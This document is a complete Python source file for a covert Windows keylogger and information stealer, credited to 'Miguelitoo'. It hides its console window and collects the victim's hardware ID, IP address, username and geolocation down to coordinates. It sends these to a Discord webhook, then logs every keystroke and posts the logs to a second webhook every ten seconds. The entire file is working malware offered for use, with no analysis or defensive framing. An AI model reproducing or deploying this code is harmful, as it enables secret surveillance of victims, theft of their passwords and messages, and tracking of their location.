# Dependencias
from discord_webhook import DiscordWebhook
from discord_webhook import DiscordEmbed
import subprocess
import requests
import colorama
from colorama import Fore, Back, Style
import uuid
import time
import os
from datetime import datetime
import pyautogui
import keyboard
from threading import Timer
import win32console, win32gui

colorama.init()
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)
# Fetch Actual HWID
hw_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

ip = requests.get('https://api.ipify.org').text # Fetch IP from Ipify API
user = str(subprocess.check_output('whoami'), 'utf-8') # Fetch PC Name

# IP Information
ip_info = requests.get('http://ip-api.com/json/' + ip).json() 
country = ip_info['country']
city = ip_info['city']
isp = ip_info['isp']
region = ip_info['regionName']
timezone = ip_info['timezone']
zip_code = ip_info['zip']
lat = ip_info['lat']
lon = ip_info['lon']

timer = 10
keylog_webhook = "KEYLOG WEBHOOK GOES HERE"
logger_webhook = "LOGGER WEBHOOK GOES HERE"

class Keylogger: 
    def __init__(self, interval, report_method="webhook"):
        now = datetime.now()
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
        self.username = os.getlogin()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_webhook(self):
        flag = False
        webhook = DiscordWebhook(url=keylog_webhook)
        if len(self.log) > 2000:
            flag = True
            path = os.environ["temp"] + "\\report.txt"
            with open(path, 'w+') as file:
                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f:
                webhook.add_file(file=f.read(), filename='report.txt')
        else:
            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
            webhook.add_embed(embed)    
        webhook.execute()
        if flag:
            os.remove(path)

    def report(self):
        if self.log:
            if self.report_method == "webhook":
                self.report_to_webhook()    
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


# Webhook URL
webhook = DiscordWebhook(url=logger_webhook, rate_limit_retry=True)
embed = DiscordEmbed(title='miguelitoo :33', description='AE')
embed.set_author(name='Made by Miguelitoo', url='')
embed.add_embed_field(name="HWID", value=f"||{hw_id}||", inline=True)
embed.add_embed_field(name="IP", value=f"||{ip}||", inline=True)
embed.add_embed_field(name="Country", value=f"||{country}||", inline=True)
embed.add_embed_field(name="City", value=f"||{city}||", inline=True)
embed.add_embed_field(name="ISP", value=f"||{isp}||", inline=True)
embed.add_embed_field(name="Region", value=f"||{region}||", inline=True)
embed.add_embed_field(name="Timezone", value=f"||{timezone}||", inline=True)
embed.add_embed_field(name="Zip Code", value=f"||{zip_code}||", inline=True)
embed.add_embed_field(name="Latitude", value=f"||{lat}||", inline=True)
embed.add_embed_field(name="Longitude", value=f"||{lon}||", inline=True)



webhook.add_embed(embed)

response = webhook.execute(remove_embeds=True, remove_files=True)


keylogger = Keylogger(interval=timer, report_method="webhook")    
keylogger.start()
